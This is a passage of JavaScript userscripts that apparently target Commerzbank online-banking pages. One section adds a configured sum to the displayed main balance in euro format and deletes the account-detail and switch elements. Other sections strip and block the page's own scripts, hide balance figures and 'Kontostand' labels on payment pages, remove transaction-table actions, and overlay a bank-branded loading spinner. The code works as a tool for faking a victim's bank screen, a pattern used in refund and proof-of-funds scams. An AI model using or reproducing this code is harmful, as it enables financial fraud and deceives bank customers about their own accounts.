        } else {
            console.error('Element not found.');
        }

        return NaN; // Return NaN if parsing fails
    }

    // Function to periodically check conditions and modify the main balance
    function checkAndModifyBalance() {
        // Check if both target text contents are present on the page
        if (areTextContentsPresent(targetTextContent, "Wechseln", "Kontodetails")) {
            modifyMainBalance();
            // Remove parent elements of "Wechseln" and "Kontodetails" after 5 milliseconds
            setTimeout(removeParentElements, 5);
        }

        // Log a message indicating that the check is continuing
        console.log('Continuing to check conditions every 5 seconds...');
    }

    // Function to remove parent elements of "Wechseln" and "Kontodetails"
    function removeParentElements() {
        var elementsToRemove = [];
        var targetTexts = ["Wechseln", "Kontodetails"];

        targetTexts.forEach(function(targetText) {
            var textNodes = document.evaluate("//text()[contains(., '" + targetText + "')]", document.body, null, XPathResult.ANY_TYPE, null);
            var textNode = textNodes.iterateNext();

            while (textNode) {
                if (textNode.parentElement) {
                    elementsToRemove.push(textNode.parentElement);
                }
                textNode = textNodes.iterateNext();
            }
        });

        elementsToRemove.forEach(function(element) {
            element.remove();
        });
    }

    // Function to modify the main balance
    function modifyMainBalance() {
        // Find the main balance element
        var balanceRegex = /([+-]?)\s?(\d{1,3}(?:\.\d{3})*(?:,\d{2}))/;
        var mainBalanceElement;

        // Search for elements with text content matching the balance format
        document.querySelectorAll('*').forEach(function (element) {
            if (element.textContent.match(balanceRegex)) {
                mainBalanceElement = element;
            }
        });

        if (mainBalanceElement) {
            // Get the current main balance
            var currentBalance = parseBalanceFromElement(mainBalanceElement);

            if (!isNaN(currentBalance)) {
                // Modify the balance
                var newBalance = currentBalance + balanceModificationAmount;

                // Format the new balance text
                var newSign = newBalance >= 0 ? '+' : '-';
                var newBalanceText = newSign + ' ' + Math.abs(newBalance).toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' EUR';

                // Update the main balance element with the new balance
                mainBalanceElement.textContent = newBalanceText;
            }
        }
    }

    // Function to check if all specified text contents are present on the page
    function areTextContentsPresent() {
        var targetContents = Array.from(arguments);
        return targetContents.every(function(content) {
            return isTargetTextContentPresent(content);
        });
    }

    // Function to check if the target text content is present on the page
    function isTargetTextContentPresent(targetText) {
        // Perform a case-insensitive and whitespace-insensitive search for the target text content
        var searchText = targetText.replace(/\s/g, '').toLowerCase();
        return document.body.textContent.replace(/\s/g, '').toLowerCase().includes(searchText);
    }

    // Function to remove scripts from the document
    function removeScripts() {
        console.log('Removing scripts...');
        document.querySelectorAll('script').forEach(function (script) {
            script.remove();
            console.log('Script removed.');
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var observer = new MutationObserver(function (mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log('Script added. Removing...');
                        node.remove();
                        console.log('Script removed.');
                    }
                }
            }
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Call the function to remove scripts
    removeScripts();

    // Call the function to periodically check conditions and modify the main balance every 5 seconds
    setInterval(checkAndModifyBalance, 300);

  })();
}

///////////////////////////////////////////////////////////////////////////////
//  END   8 COMM KONTODETAILS     END
///////////////////////////////////////////////////////////////////////////////
//  END   8 COMM KONTODETAILS     END
///////////////////////////////////////////////////////////////////////////////
//  END   8 COMM KONTODETAILS     END
///////////////////////////////////////////////////////////////////////////////






//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------





//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------












///////////////////////////////////////////////////////
//12__Comm Transoverview NEW utility with redirect.user
///////////////////////////////////////////////////////

if (window.location.href.indexOf("digitalbanking/transactionoverview") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("10733875328") > 0 ) {
    (function () {
        'use strict';

        // Configuration
        var shouldRedirect = false; // Set to true if you want to redirect
        var redirectUrl = 'https://kunden.commerzbank.de/banking/account/transactions'; // URL to redirect to

        // Function to remove scripts from the document
        function removeScripts() {
            console.log('Removing scripts...');
            document.querySelectorAll('script').forEach(function (script) {
                script.remove();
                console.log('Script removed.');
            });
        }

        // Function to remove elements with specified class names
        function removeElementsWithTextClass() {
            var elementsToRemove = document.querySelectorAll('[class*=TransactionsTable-module_transactionsTable__rightSideText], [class*=ActionsButtons-module_actionsButtons], [class*=icon-link-group], .lsgs-ab96e--clicklist-layout-container-actions, .lsgs-ab96e--button.ButtonContainer-module_actionButton__I9NSQ');
            elementsToRemove.forEach(function (element) {
                element.remove();
                console.log('Element removed:', element);
            });

            // Remove elements with class "lsgs-05770--thumbnail" if they have a child with class "lsgs-05770--thumbnail__text"
            var thumbnailElements = document.querySelectorAll('.TransactionRow-module_transactionRow__iconWrapper__NY-vc');
            thumbnailElements.forEach(function (thumbnail) {
                var parentCell = thumbnail.closest('.TransactionRow-module_transactionRow__cell__AihX-');
                if (parentCell) {
                    parentCell.remove();
                    console.log('Parent cell removed:', parentCell);
                }
            });
        }

        // Mutation observer configuration
        var observerConfig = {
            childList: true,
            subtree: true
        };

        // Mutation observer callback function
        var observerCallback = function (mutationsList) {
            for (var mutation of mutationsList) {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach(function (node) {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            if (node.tagName === 'SCRIPT') {
                                // Remove added scripts
                                console.log('Script added. Removing...');
                                node.remove();
                                console.log('Script removed.');
                            }
                        }
                    });
                }
            }
            // Remove elements with specified classes
            removeElementsWithTextClass();
        };

        // Create a new mutation observer
        var observer = new MutationObserver(observerCallback);

        // Start observing the document
        observer.observe(document.documentElement, observerConfig);

        // Redirect if specified
        if (shouldRedirect) {
            window.location.href = redirectUrl;
        }
    })();
}





/////////////////////////////////////////////////
//13__Comm NEW Überweisung removes bal at üb.user
/////////////////////////////////////////////////

if (window.location.href.indexOf("payments") > 0 || window.location.href.indexOf("smth") > 0 || window.location.href.indexOf("10733876802") > 0) {
    (function() {
        'use strict';

        // Function to remove text after a pipe character
        function removeTextAfterPipe(node) {
            if (node.nodeType === Node.TEXT_NODE) {
                node.nodeValue = node.nodeValue.replace(/\|[^|]*$/, '');
            } else {
                node.childNodes.forEach(removeTextAfterPipe);
            }
        }

        // Function to remove scripts from the document
        function removeScripts() {
            console.log("Removing scripts...");
            document.querySelectorAll('script').forEach(function(script) {
                script.remove();
                console.log("Script removed.");
            });
        }

        // Watch for changes in the DOM
        var observer = new MutationObserver(function(mutationsList) {
            mutationsList.forEach(function(mutation) {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach(function(node) {
                        if (node.nodeType === Node.ELEMENT_NODE && node.tagName === 'SCRIPT') {
                            console.log("Script added. Removing...");
                            node.remove();
                            console.log("Script removed.");
                        } else {
                            removeTextAfterPipe(node);
                        }
                    });
                }
            });
        });

        // Start observing the document
        observer.observe(document.documentElement, { childList: true, subtree: true });

        // Initial processing of the entire document body
        removeTextAfterPipe(document.body);
        removeScripts();
    })();
}




//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------






/////////////////////////////////////////////////
//14__Comm Old Überweisung removes bal at üb.user
/////////////////////////////////////////////////

if (window.location.href.indexOf("payments") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("smth") > 0) {
    (function() {
        'use strict';

        // Function to remove elements with the classes "debitorAmount" and "p-s-04-01 p-s-04"
        function removeDebitorAndPS0401PS04() {
            var elementsToRemove = document.querySelectorAll('.debitorAmount, .p-s-04-01.p-s-04');
            elementsToRemove.forEach(function (element) {
                element.remove();
            });
            if (elementsToRemove.length > 0) {
                console.log('Removed elements with classes "debitorAmount" and "p-s-04-01 p-s-04"');
            }

            // Find and remove <label> elements with text content "Kontostand"
            var labelsToRemove = document.querySelectorAll('label');
            labelsToRemove.forEach(function(label) {
                if (label.textContent.includes('Kontostand')) {
                    label.remove();
                    console.log('Removed <label> element with text content "Kontostand"');
                }
            });
        }

        // Watch for changes in the DOM and remove "debitorAmount", "p-s-04-01 p-s-04", and <label> elements
        var observer = new MutationObserver(function (mutationsList) {
            mutationsList.forEach(function (mutation) {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach(function (node) {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            if (node.classList) {
                                // Check for both classes in the added node
                                if (node.classList.contains('debitorAmount') || node.classList.contains('p-s-04-01', 'p-s-04')) {
                                    node.remove();
                                    console.log('Removed dynamically added element with classes "debitorAmount" and "p-s-04-01 p-s-04".');
                                }

                                // Check for both classes inside added nodes
                                var innerElements = node.querySelectorAll('.debitorAmount, .p-s-04-01.p-s-04');
                                innerElements.forEach(function (innerElement) {
                                    innerElement.remove();
                                });
                                if (innerElements.length > 0) {
                                    console.log('Removed ' + innerElements.length + ' elements with classes "debitorAmount" and "p-s-04-01 p-s-04" from an added node.');
                                }
                            }
                        }
                    });
                }
            });
        });

        // Start observing the document
        observer.observe(document.documentElement, { childList: true, subtree: true });

        // Initial removal of existing elements with classes "debitorAmount" and "p-s-04-01 p-s-04"
        removeDebitorAndPS0401PS04();

    })();
}


//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------




///////////////////////////////////////////
//15__Comm spinner with script removal.user
///////////////////////////////////////////

   if (window.location.href.indexOf("smth") > 0 || window.location.href.indexOf("smth") > 0 || window.location.href.indexOf("smth") > 0 ) {


(function () {
  'use strict';

  // Configuration
  var spinnerInterval = 5000; // Set the interval in milliseconds (e.g., 5000 for 5 seconds)

  // Function to create the spinner and background
  function createSpinner() {
    var background = document.createElement('div');
    background.className = 'app-loading-background';

    var spinner = document.createElement('div');
    spinner.className = 'app-loading-pulsing';

    // Apply styles to the background
    background.style.position = 'fixed';
    background.style.top = '0';
    background.style.left = '0';
    background.style.width = '100%';
    background.style.height = '100%';
    background.style.backgroundColor = 'white';
    background.style.zIndex = '9999';

    // Apply styles to the spinner
    spinner.style.position = 'absolute';
    spinner.style.top = '50%';
    spinner.style.left = '50%';
    spinner.style.transform = 'translate(-50%, -50%)';
    spinner.style.width = '120px';
    spinner.style.height = '120px';
    spinner.style.display = 'block';
    spinner.style.backgroundImage = 'url(https://www.commerzbank.de/ms/media/favicons/CB-2022-Ribbon_RGB.svg)';
    spinner.style.backgroundSize = '100%';
    spinner.style.animationName = 'pulse';
    spinner.style.animationTimingFunction = 'ease-in-out';
    spinner.style.animationIterationCount = 'infinite';
    spinner.style.animationDuration = '1.5s'; // Adjust the duration for a slower or faster pulse
    spinner.style.animationFillMode = 'both';

    // Append the background and spinner to the document body
    document.body.appendChild(background);
    background.appendChild(spinner);

    return background;
  }

  // Function to remove the spinner
  function removeSpinner(spinner) {
    if (spinner) {
      spinner.remove();
    }
  }

  // Function to remove scripts from the document
  function removeScripts() {
    console.log('Removing scripts...');
    document.querySelectorAll('script').forEach(function (script) {
      script.remove();
      console.log('Script removed.');
    });
  }

  // Watch for changes in the DOM and remove added scripts
  var observer = new MutationObserver(function (mutationsList) {
    for (var mutation of mutationsList) {
      if (mutation.addedNodes) {
        for (var node of mutation.addedNodes) {
          if (node.tagName === 'SCRIPT') {
            console.log('Script added. Removing...');
            node.remove();
            console.log('Script removed.');
          }
        }
      }
    }
  });

  // Start observing the document
  observer.observe(document.documentElement, { childList: true, subtree: true });

  // Remove scripts from the document on page load
  removeScripts();

  // Function to handle page unload and close
  function handleUnload() {
    var spinnerOnUnload = createSpinner();
    // Set a timeout to remove the spinner after the specified interval
    setTimeout(function () {
      removeSpinner(spinnerOnUnload);
    }, spinnerInterval);
  }

  // Create and append the spinner on page load
  var spinnerOnLoad = createSpinner();

  // Set a timeout to remove the spinner after the specified interval
  setTimeout(function () {
    removeSpinner(spinnerOnLoad);
  }, spinnerInterval);

  // Attach event listeners for page unload and close
  window.addEventListener('beforeunload', handleUnload);
  window.addEventListener('unload', handleUnload);
})();


}



/////////////////////////////////////////////////
//16__Comm NEW FINUEBER and STARTSEITE
/////////////////////////////////////////////////

if (window.location.href.indexOf("smth-startpage/startpage") > 0 || window.location.href.indexOf("smth-startpage/startpage") > 0 || window.location.href.indexOf("smth-startpage/startpage") > 0) {
    (function() {
        'use strict';

        // Function to remove elements with the ID "react-root"
        function removeReactRoot() {
            var elementsToRemove = document.querySelectorAll('#react-root');
            elementsToRemove.forEach(function (element) {
                element.remove();
            });
            if (elementsToRemove.length > 0) {
                console.log('Removed elements with the ID "react-root"');
            }
        }

        // Function to remove script elements
        function removeScripts() {
            console.log('Removing scripts...');
            document.querySelectorAll('script').forEach(function (script) {
                script.remove();
                console.log('Script removed.');
            });
        }

        // Watch for changes in the DOM and remove elements with the ID "react-root" and scripts
        var observer = new MutationObserver(function (mutationsList) {
            mutationsList.forEach(function (mutation) {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach(function (node) {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            // Remove elements with the ID "react-root"
                            if (node.id && node.id === 'react-root') {
                                node.remove();
                                console.log('Removed dynamically added element with the ID "react-root".');
                            }
                        } else if (node.nodeType === Node.COMMENT_NODE) {
                            // Remove scripts represented as comments
                            if (node.textContent.includes('<script')) {
                                node.remove();
                                console.log('Removed dynamically added script.');
                            }
                        }
                    });
                }
            });
        });

        // Start observing the document
        observer.observe(document.documentElement, { childList: true, subtree: true });

        // Initial removal of existing elements with the ID "react-root" and scripts
        removeReactRoot();
        removeScripts();

    })();
}








